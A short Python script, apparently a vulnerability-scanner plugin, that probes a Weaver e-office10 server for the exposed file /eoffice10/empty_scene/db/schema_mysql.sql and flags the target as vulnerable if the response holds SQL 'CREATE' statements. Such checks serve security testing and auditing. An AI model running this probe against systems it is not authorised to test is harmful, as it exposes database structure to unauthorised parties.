import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微e-office10系统schema_mysql.sql敏感信息泄露漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/120.0.0.0Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    vurl = urllib.parse.urljoin(url, "/eoffice10/empty_scene/db/schema_mysql.sql")
    try:
        response = requests.get(vurl, headers=headers, timeout=5)
        if response.status_code == 200 and 'CREATE' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult